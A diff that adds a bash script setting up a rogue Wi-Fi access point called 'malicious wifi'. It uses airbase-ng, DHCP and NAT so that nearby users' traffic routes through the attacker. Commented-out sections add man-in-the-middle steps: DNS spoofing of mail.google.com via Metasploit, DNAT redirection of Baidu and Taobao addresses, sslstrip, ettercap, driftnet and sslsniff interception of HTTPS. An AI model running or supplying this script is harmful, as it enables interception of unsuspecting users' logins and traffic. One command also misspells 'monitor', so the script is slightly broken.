@@ -1,0 +1,90 @@
+#!/bin/bash
+#WifiCreate
+
+#reset iptables
+iptables -t nat -F
+iptables -t nat -X  
+iptables -t nat -P PREROUTING ACCEPT  
+iptables -t nat -P POSTROUTING ACCEPT  
+iptables -t nat -P OUTPUT ACCEPT  
+iptables -t mangle -F  
+iptables -t mangle -X  
+iptables -t mangle -P PREROUTING ACCEPT  
+iptables -t mangle -P INPUT ACCEPT  
+iptables -t mangle -P FORWARD ACCEPT  
+iptables -t mangle -P OUTPUT ACCEPT  
+iptables -t mangle -P POSTROUTING ACCEPT  
+iptables -F  
+iptables -X  
+iptables -P FORWARD ACCEPT  
+iptables -P INPUT ACCEPT  
+iptables -P OUTPUT ACCEPT  
+iptables -t raw -F  
+iptables -t raw -X  
+iptables -t raw -P PREROUTING ACCEPT  
+iptables -t raw -P OUTPUT ACCEPT
+
+
+#set in mode monitor
+rfkill unblock all
+ifconfig wlan0 down
+iwconfig wlan0 mode moniter &
+sleep 2
+ifconfig wlan0 up
+
+#mode check
+airmon-ng check kill
+airmon-ng start wlan0 &
+sleep 2
+
+#start Wifi
+gnome-terminal -x bash -c "airbase-ng -e 恶意wifi -c 6 wlan0"
+sleep 2
+
+#virtual card set
+ifconfig at0 up
+ifconfig at0 10.0.0.1 netmask 255.255.255.0
+ifconfig at0 mtu 1492
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+#dhcp configuration
+dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
+echo "Before Start~" &
+sleep 2
+service isc-dhcp-server start &
+sleep 2
+
+#Nessary nat
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356
+
+#Optional nat
+#gnome-terminal -x bash -c "dnschef -i 10.0.0.1 --nameserver 210.73.64.1"
+#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+#Extra functions
+#iptables -t nat -A PREROUTING -s 10.0.0.10 -d 202.108.22.5 -p tcp --dport 80 -j DNAT --to 192.168.16.58
+#baidu:202.108.22.5
+#taobao：140.205.164.47
+
+#sniff&trap
+#gnome-terminal -x bash -c "sslstrip -l 10000"
+#gnome-terminal -x bash -c "ettercap -T -q -i at0"
+#driftnet -i at0
+
+#metasploit_commands
+#use auxiliary/server/fakedns
+#show options
+#set TARGETACTION FAKE
+#set TARGETDOMAIN mail.google.com
+#set TARGETHOST 10.0.0.1
+#run
+
+#iptables_Delete_command
+#iptables -D PREROUTING 1 -t nat
+
+#sslsniff_commands
+#sslsniff -a -c /usr/share/sslsniff/certs/wildcard -s 777 -w ./729test
+#iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 777
